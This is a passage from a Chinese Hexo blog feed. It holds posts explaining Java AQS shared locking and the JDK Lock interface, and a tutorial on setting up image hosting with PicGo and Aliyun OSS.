当前线程节点的前驱节点为头节点时</span><br>            <span class="hljs-keyword">if</span> (p == head) &#123;<br>                <span class="hljs-comment">// 再次尝试获取资源</span><br>                <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> tryAcquireShared(arg);<br>                <span class="hljs-comment">// 资源数大于等于0，说明获取成功</span><br>                <span class="hljs-keyword">if</span> (r &gt;= <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-comment">// 设置头节点，若r &gt; 0即还有剩余资源，则唤醒之后的线程节点</span><br>                    setHeadAndPropagate(node, r);<br>                    p.next = <span class="hljs-literal">null</span>; <span class="hljs-comment">// help GC</span><br>                    <span class="hljs-keyword">if</span> (interrupted)<br>                        selfInterrupt();<br>                    failed = <span class="hljs-literal">false</span>;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;<br>                parkAndCheckInterrupt())<br>                interrupted = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (failed)<br>            cancelAcquire(node);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-5-共享式释放"><a href="#4-5-共享式释放" class="headerlink" title="4.5 共享式释放"></a>4.5 共享式释放</h3><p>共享式释放会调用releaseShared方法，释放指定数量的资源。其中tryReleaseShared方法仍然需要我们自己去实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">releaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> &#123;<br>    <span class="hljs-keyword">if</span> (tryReleaseShared(arg)) &#123;<br>        doReleaseShared();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中doReleaseShared方法主要用于释放完资源后，去唤醒后续处于等待状态的各个节点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doReleaseShared</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 通过循环与CAS操作确保资源被线程安全地释放</span><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">Node</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> head;<br>        <span class="hljs-keyword">if</span> (h != <span class="hljs-literal">null</span> &amp;&amp; h != tail) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> h.waitStatus;<br>            <span class="hljs-keyword">if</span> (ws == Node.SIGNAL) &#123;<br>                <span class="hljs-keyword">if</span> (!compareAndSetWaitStatus(h, Node.SIGNAL, <span class="hljs-number">0</span>))<br>                    <span class="hljs-keyword">continue</span>;            <br>                unparkSuccessor(h);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ws == <span class="hljs-number">0</span> &amp;&amp;<br>                     !compareAndSetWaitStatus(h, <span class="hljs-number">0</span>, Node.PROPAGATE))<br>                <span class="hljs-keyword">continue</span>;                <br>        &#125;<br>        <span class="hljs-keyword">if</span> (h == head)                   <br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-写在后面"><a href="#5-写在后面" class="headerlink" title="5. 写在后面"></a>5. 写在后面</h2><p>参考文献：</p><blockquote><ol><li><p>JDK5.0源码</p></li><li><p>《Java并发编程的艺术》</p></li><li><p><a href="https://www.bilibili.com/video/BV16J411h7Rd/?spm_id_from=333.337.search-card.all.click&vd_source=4e7654633e4719c03a8fb6c6b524ddc2">黑马Java并发编程教程</a></p></li></ol></blockquote><p>这个系列大概会有5篇左右的样子，我尽可能把自己对于JUC的理解通俗易懂地写出来</p><p>但如果有错误的地方，请大家指出来，我会及时去学习与改进~</p><p>如果大家觉得我的内容写的还不错，可以在评论区留言支持一下呀~</p><p>欢迎大家来逛一逛我的<a href="https://ltyzzzxxx.github.io/">个人博客</a>~</p><p>此外，从2022.10.1开始，为激励自己持续刷题，我开始持续日更Leetcode题解啦~</p><p>所有题解均已放到<a href="https://github.com/ltyzzzxxx/Leetcode-Everyday">Github仓库</a>中，欢迎大家Star并提出Issue~</p>]]></content>
    
    
    <categories>
      
      <category>并发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>锁</tag>
      
      <tag>JUC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo从0到1搭建博客系列04：图床的最佳实践</title>
    <link href="/2022/10/15/Hexo%E4%BB%8E0%E5%88%B01%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%B3%BB%E5%88%9704%EF%BC%9A%E5%9B%BE%E5%BA%8A%E7%9A%84%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/"/>
    <url>/2022/10/15/Hexo%E4%BB%8E0%E5%88%B01%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%B3%BB%E5%88%9704%EF%BC%9A%E5%9B%BE%E5%BA%8A%E7%9A%84%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo从0到1搭建博客系列04：图床的最佳实践"><a href="#Hexo从0到1搭建博客系列04：图床的最佳实践" class="headerlink" title="Hexo从0到1搭建博客系列04：图床的最佳实践"></a>Hexo从0到1搭建博客系列04：图床的最佳实践</h1><h2 id="1-前言：为什么要使用图床？"><a href="#1-前言：为什么要使用图床？" class="headerlink" title="1. 前言：为什么要使用图床？"></a>1. 前言：为什么要使用图床？</h2><p>之前我们已经讲过如何用Hexo发表文章。但是，一篇优秀的知识分享与技术博客，怎么能少得了图片呢？</p><p>但是，文章中的图片存储在哪里？</p><ol><li>当我们在本地写博客做笔记（用Typora或MarkText）时，我们一般会把图片存在当前文章的路径下</li><li>当我们在CSDN、掘金或知乎等平台上写博客时，我们的图片会被存储到这些网站对应的服务器中</li><li>而当我们的博客发布在Hexo上时，图片的加载路径有以下两种方式：<ol><li>参照我们本地写博客的方式，将图片存储到Hexo下的public资源文件夹下</li><li>参照在技术论坛写博客的方式，将图片存储到服务器上</li></ol></li></ol><p>如果将图片资源都存储到Hexo的文件中，会变得很臃肿，所以不采用该方案。</p><p>我们这里所要说的就是将图片存储到服务器上，即图床这种方式。</p><p>但这时候你会想，本来使用Hexo做博客就是为了省事省钱、不买服务器，而为了存图片，再买服务器吗？</p><p>不必担心，各大云服务商平台都提供了图片存储，也是对象存储的云服务器！而且价格远低于服务器！</p><p>接下来进入正题！</p><h2 id="2-方案选择"><a href="#2-方案选择" class="headerlink" title="2. 方案选择"></a>2. 方案选择</h2><p>以下几种方案都极其简单，原理都很类似</p><h3 id="方案一：Github仓库-Picgo-jsDelivr-CDN"><a href="#方案一：Github仓库-Picgo-jsDelivr-CDN" class="headerlink" title="方案一：Github仓库 + Picgo + jsDelivr CDN"></a>方案一：Github仓库 + Picgo + jsDelivr CDN</h3><p>这一种方案我在实操之后，发现国内用户无法访问，是因为最近国内将jsDelivrCDN给墙了，无法通过其对Github进行加速</p><p>但是我还是简单介绍一下，</p><ol><li><p>创建Github公共仓库，名字随便，注意一定要是公共的，否则别人无法访问到图片资源。</p></li><li><p>下载 <a href="https://github.com/Molunerfinn/PicGo/releases">Picgo</a></p><blockquote><p>  <strong>PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具</strong></p></blockquote></li><li><p>将Github创建仓库信息配置到Picgo中。打开Picgo，点击图床设置，选择Github图床，填写如下信息。</p><p>仓库名就写你之前创建好的仓库名</p><p>分支填现有的分支就可以</p><p>其中的Token可以在Github - Settings - Personal access tokens 中生成，只选择repo选项就可以</p><ul><li>如果不知道如何生成的话，可以查看现成的相关<a href="https://www.cnblogs.com/leon-2016/p/9284837.html">攻略</a></li></ul><p>指定存储路径可填可不填</p><p>自定义域名这里填写：<code>https://cdn.jsdelivr.net/gh/用户名/仓库名</code>，因为我们采用了jsDelivr CDN进行加速，虽然现在没有任何卵用</p><p>最后保存为默认图床即可</p></li></ol><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221015200744589.png" alt="image-20221015200744589"></p><h3 id="方案二：Gitee仓库-Picgo"><a href="#方案二：Gitee仓库-Picgo" class="headerlink" title="方案二：Gitee仓库 + Picgo"></a>方案二：Gitee仓库 + Picgo</h3><p>Gitee虽然说是国内平台，访问是没问题的。但是听说它经常崩，我有点担心，就没有去尝试。</p><p>其方法和Github几乎一模一样，只是选择了用Gitee创建仓库。</p><p>在这里我也不推荐使用这种方案</p><h3 id="方案三：阿里云对象存储-Picgo"><a href="#方案三：阿里云对象存储-Picgo" class="headerlink" title="方案三：阿里云对象存储 + Picgo"></a>方案三：阿里云对象存储 + Picgo</h3><p>之前没有使用过阿里云的小伙伴可以仔细学一学啦，</p><p>以后搭建个人网站都需要用到服务器，网站上的图片视频资源也肯定需要用到云存储，所以不可避免要和各类云服务商打交道。</p><p>而阿里云应该是国内最知名的几家云服务商之一了</p><ol><li>登录阿里云网站，进入工作台页面，搜索对象存储，进入该页面，然后点击bucket列表</li></ol><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221015202120960.png" alt="image-20221015202120960"></p><ol start="2"><li><p>进入页面，点击创建bucket.</p><ul><li>Bucket名称和地域必填。地域选择一个距离自己近一些的地方。</li><li>读写权限选择为公共读，其余均默认</li></ul><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221015202336953.png" alt="image-20221015202336953"></p></li><li><p>点击网页右上角的头像，再点击AccessKey管理，进入该页面</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221015202601913.png" alt="image-20221015202601913"></p></li><li><p>点击创建AccessKey，将创建号的key复制保存下来，之后在Picgo上需要用到</p></li><li><p>打开Picgo，点击图床设置，选择阿里云OSS，填写如下信息。</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221015202826913.png" alt="image-20221015202826913"></p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>结合历史经验，为了网站图片存储的稳定，我们还是选择方案三作为我们图床实践的最佳选择</p><p>可能后期图片访问量大的话，需要充一点钱，但是也很便宜，大概一年40GB只需要9块钱，相当划算啦</p><h2 id="3-结合Typora使用"><a href="#3-结合Typora使用" class="headerlink" title="3. 结合Typora使用"></a>3. 结合Typora使用</h2><p>当我们成功搭建好图床之后，每次写Markdown文档时，都需要先截图，再保存，然后手动打开Picgo完成上传，最后将图片地址复制到Markdown文档中。</p><p>如何做到更加高效地上传图片到图床呢？</p><p>用Typora写笔记，只需要先截图，再粘贴到Markdown文档，即可直接跳过上传操作，Typora帮我们自动完成。</p><p>操作为：打开Typora的设置，点击图像，按照我给的图片进行设置</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221015203547504.png" alt="image-20221015203547504"></p><p>之后，我们便可以愉快地用Hexo写图文并茂的博客啦~</p><h2 id="4-后记"><a href="#4-后记" class="headerlink" title="4. 后记"></a>4. 后记</h2><p>如果大家觉得我的内容写的还不错，可以在评论区留言支持一下呀~</p><p>欢迎大家来逛一逛我的<a href="https://ltyzzzxxx.github.io/">个人博客</a>~</p><p>此外，从2022.10.1开始，为激励自己持续刷题，我开始持续日更Leetcode题解啦~</p><p>所有题解均已放到<a href="https://github.com/ltyzzzxxx/Leetcode-Everyday">Github仓库</a>中，欢迎大家Star并提出Issue~</p>]]></content>
    
    
    <categories>
      
      <category>Hexo搭建博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>详解JDK锁01:Lock接口</title>
    <link href="/2022/10/12/%E8%AF%A6%E8%A7%A3JDK%E9%94%8101-Lock%E6%8E%A5%E5%8F%A3/"/>
    <url>/2022/10/12/%E8%AF%A6%E8%A7%A3JDK%E9%94%8101-Lock%E6%8E%A5%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="详解JDK锁01：Lock接口"><a href="#详解JDK锁01：Lock接口" class="headerlink" title="详解JDK锁01：Lock接口"></a>详解JDK锁01：Lock接口</h1><h2 id="1-Lock简介"><a href="#1-Lock简介" class="headerlink" title="1. Lock简介"></a>1. Lock简介</h2><p>先引用Lock接口源码中作者贴的一段话</p><blockquote><p>Lock implementations provide more extensive locking operations than can be obtained using synchronized methods and statements. They allow more <code>flexible structuring</code>, may have quite <code>different properties</code>, and may support <code>multiple associated Condition objects</code>.</p></blockquote><p>其实这段话就简单概括了Lock的三大优点：</p><ol><li><p>灵活的结构：可以显式地获取与释放锁</p></li><li><p>多种不同的属性与方法</p></li><li><p>引入了 <code>Condition</code> 对象</p></li></ol><p>接下来的部分将着重介绍这几点</p><h2 id="2-Lock锁的灵活性"><a href="#2-Lock锁的灵活性" class="headerlink" title="2. Lock锁的灵活性"></a>2. Lock锁的灵活性</h2><h3 id="2-1-Lock接口方法"><a href="#2-1-Lock接口方法" class="headerlink" title="2.1 Lock接口方法"></a>2.1 Lock接口方法</h3><p>在 JDK5.0 之前，Java是借助于 <code>Synchronized</code> 关键字实现加锁功能，而这个功能是通过JVM实现的。而在 JDK5.0 之后，JUC包中新增了Lock接口实现锁功能。</p><p>虽然该Lock接口不具备 <code>Synchronized</code> 关键字隐式获取锁的便捷性，但是其提供了一系列手动操作锁的方法：</p><ol><li>阻塞式地获取锁</li></ol><p>  该方法有一定的缺陷：如果当前锁被占用，那么当前线程将被禁用，进入阻塞状态，直到获取到锁为止。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><ol start="2"><li>阻塞式地可打断地获取锁</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">lockInterruptibly</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException;<br></code></pre></td></tr></table></figure><p>  虽然是阻塞式地获取锁，但是如果该线程被中断后，会抛出异常，停止继续阻塞。</p><ol start="3"><li>非阻塞式地获取锁</li></ol><p>  尝试非阻塞地获取锁，调用该方法后立即返回</p><ul><li><p>若能够获取到锁，则返回 true</p></li><li><p>若锁已被占用，则返回 false</p></li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p>  该方法的典型使用场景为：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 伪代码</span><br><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> ...;<br><span class="hljs-keyword">if</span> (lock.tryLock() &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 操作共享资源</span><br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-comment">// 释放锁</span><br>        lock.unlock();<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 未获取到锁，执行其余操作</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>带有超时时间地获取锁</li></ol><p>  尝试在指定的一段时间内获取锁</p><ul><li><p>若在指定时间 <code>time</code> 内能够获取到锁，且未被中断，则返回 true</p></li><li><p>若指定时间 <code>time</code> 结束后仍未获取到锁，则返回 false</p></li><li><p>若在指定时间 <code>time</code> 内被打断，则抛出 <code>InterruptedException</code></p></li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException;<br></code></pre></td></tr></table></figure><p>  其中 <code>time</code> 代表指定的超时时间，<code>unit</code> 代表时间单位</p><ol start="5"><li>释放锁</li></ol>  <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlock</span>()</span>;<br></code></pre></td></tr></table></figure><h3 id="2-2-灵活性体现"><a href="#2-2-灵活性体现" class="headerlink" title="2.2 灵活性体现"></a>2.2 灵活性体现</h3><p>使用 <code>Synchronized</code> 关键字进行获取锁与释放锁操作时：</p><p>当嵌套式地获取锁之后，其释放锁的顺序必须与获取锁的顺序相反</p><p>如下获取锁顺序为：lock1 -&gt; lock2 -&gt; lock3</p><p>释放锁顺序为：lock3 -&gt; lock2 -&gt; lock1</p><p>从外到内获取锁，从内到外释放锁</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br><span class="hljs-type">Object</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br><span class="hljs-type">Object</span> <span class="hljs-variable">lock3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br><span class="hljs-keyword">synchronized</span> (lock1) &#123;<br>    System.out.println(<span class="hljs-string">&quot;获取到lock1锁&quot;</span>);<br>    <span class="hljs-keyword">synchronized</span> (lock2) &#123;<br>        System.out.println(<span class="hljs-string">&quot;获取到lock2锁&quot;</span>);<br>        <span class="hljs-keyword">synchronized</span> (lock3) &#123;<br>            System.out.println(<span class="hljs-string">&quot;获取到lock3锁&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是我们假设存在这一业务需求：</p><p>先获取锁A，再获取锁B，再释放锁A，再获取锁C，再释放锁B，再获取锁D。</p><p>这种获取锁的顺序与释放锁的顺序是不固定的，此时无法用 <code>Synchronized</code> 解决。</p><p>而采用Lock接口实现锁则可以完美解决这一问题，因为它提供了手动的加锁解锁方法！</p><h2 id="3-Lock锁的多种功能"><a href="#3-Lock锁的多种功能" class="headerlink" title="3. Lock锁的多种功能"></a>3. Lock锁的多种功能</h2><p>Lock接口中虽然只提供了简单的获取锁与释放锁的基本方法，但是其实现类ReentrantLock中实现了多种方法，提供了不同的功能。</p><blockquote><p>这一篇文章只对Lock接口进行详细介绍，所以以下只做简单的文字介绍。</p><p>后续文章会通过源码解读 <code>ReentrantLock</code></p></blockquote><ol><li>实现公平锁与非公平锁。实例化ReentrantLock时，其有参构造方法中传入的值为boolean类型。若传入值为true，为公平锁；否则为非公平锁</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ReentrantLock</span><span class="hljs-params">(<span class="hljs-type">boolean</span> fair)</span> &#123;<br>    sync = fair ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">FairSync</span>() : <span class="hljs-keyword">new</span> <span class="hljs-title class_">NonfairSync</span>();<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>判断锁是否已经被持有</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLocked</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> sync.isLocked();<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>判断锁是否为公平锁</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isFair</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">return</span> sync <span class="hljs-keyword">instanceof</span> FairSync;  <br>&#125;<br></code></pre></td></tr></table></figure><p>相较于Lock接口，<code>Synchronized</code> 只实现了非公平锁。</p><h2 id="4-Condition基本使用"><a href="#4-Condition基本使用" class="headerlink" title="4. Condition基本使用"></a>4. Condition基本使用</h2><p>回顾 <code>Synchronized</code> 关键字，其实现 <code>等待/通知</code> 的模式是通过 <code>Object</code> 类内部的 <code>wait</code>、<code>notify</code> 以及 <code>notifyAll</code> 实现的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <br><span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;  <br>    <span class="hljs-keyword">synchronized</span> (lock) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            lock.wait();  <br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);  <br>        &#125;  <br>        System.out.println(<span class="hljs-string">&quot;Thread1已被唤醒&quot;</span>);  <br>    &#125;  <br>&#125;);  <br>thread1.start();  <br>Thread.sleep(<span class="hljs-number">2000</span>);  <br><span class="hljs-keyword">synchronized</span> (lock) &#123;  <br>    System.out.println(<span class="hljs-string">&quot;唤醒Thread1&quot;</span>);  <br>    lock.notify();  <br>    <span class="hljs-comment">// lock.notifyAll();  </span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中，<code>notify</code> 方法是唤醒 <code>lock</code> 锁上的其中一个线程，<code>notifyAll</code> 方法是唤醒 <code>lock</code> 锁上的全部线程。</p><p>然而，这两种方法均不能指定想要唤醒的线程。</p><p>Condition的出现很好地解决了这一问题，可以分组唤醒想要唤醒的线程。</p><p>如下为Condition的基本实现方式：需要使用 <code>ReentrantLock</code> 实现 <code>Lock</code> 接口</p><blockquote><p>后续文章会详细解读 <code>Condition</code></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();  <br><span class="hljs-type">Condition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> lock.newCondition();  <br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;  <br>    lock.lock();  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            System.out.println(<span class="hljs-string">&quot;Thread1进入等待&quot;</span>);  <br>            condition.await();  <br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);  <br>        &#125;  <br>        System.out.println(<span class="hljs-string">&quot;Thread1已被唤醒&quot;</span>);  <br>    &#125; <span class="hljs-keyword">finally</span> &#123;  <br>        lock.unlock();  <br>    &#125;  <br>&#125;).start();  <br><br>Thread.sleep(<span class="hljs-number">3000</span>);  <br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;  <br>    lock.lock();  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;唤醒Thread1&quot;</span>);  <br>        condition.signal();  <br>    &#125; <span class="hljs-keyword">finally</span> &#123;  <br>        lock.unlock();  <br>    &#125;  <br>&#125;).start();<br></code></pre></td></tr></table></figure><h2 id="5-Lock与Synchronized-对比"><a href="#5-Lock与Synchronized-对比" class="headerlink" title="5. Lock与Synchronized 对比"></a>5. Lock与Synchronized 对比</h2><ol><li><p><code>Lock</code> 所处的层面是JDK，是人为通过Java代码而实现的；而 <code>Synchronized</code> 是Java的关键字，是底层C++语言实现，处于JVM层面。</p></li><li><p><code>Lock</code> 获取和释放锁的顺序不固定，因为其内置了手动操作锁的方法；而 <code>Synchronized</code> 必须按照获取锁的相反顺序去释放锁。</p></li><li><p><code>Lock</code> 可以非阻塞式地获取锁（ <code>tryLock</code> 方法）；而 <code>Synchronized</code> 只能通过阻塞式地获取锁，若当前锁已被其他线程获取，那么该线程只能阻塞等待。</p></li><li><p><code>Lock</code> 既可实现公平锁，也可实现非公平锁；而 <code>Synchronized</code>只能实现非公平锁。</p></li><li><p><code>lock</code> 等待锁过程中可以用 <code>lockInterruptibly</code> 来中断等待，而synchronized只能等待锁的释放，不能响应中断；</p></li></ol><h2 id="6-写在后面"><a href="#6-写在后面" class="headerlink" title="6. 写在后面"></a>6. 写在后面</h2><p>参考文献：</p><blockquote><ol><li><p>JDK5.0源码</p></li><li><p>《Java并发编程的艺术》</p></li><li><p><a href="https://www.bilibili.com/video/BV16J411h7Rd/?spm_id_from=333.337.search-card.all.click&vd_source=4e7654633e4719c03a8fb6c6b524ddc2">黑马Java并发编程教程</a></p></li></ol></blockquote><p>这个系列大概会有5篇左右的样子，我尽可能把自己对于JUC的理解通俗易懂地写出来</p><p>但如果有错误的地方，请大家指出来，我会及时去学习与改进~</p><p>如果大家觉得我的内容写的还不错，可以在评论区留言支持一下呀~</p><p>欢迎大家来逛一逛我的<a href="https://ltyzzzxxx.github.io/">个人博客</a>~</p><p>此外，从2022.10.1开始，为激励自己持续刷题，我开始持续日更Leetcode题解啦~</p><p>所有题解均已放到<a href="https://github.com/ltyzzzxxx/Leetcode-Everyday">Github仓库</a>中，欢迎大家Star并提出Issue~</p>]]></content>
    
    
    <categories>
      
      <category>并发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>锁</tag>
      
      <tag>JUC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分布式锁学习笔记</title>
    <link href="/2022/10/09/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/10/09/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
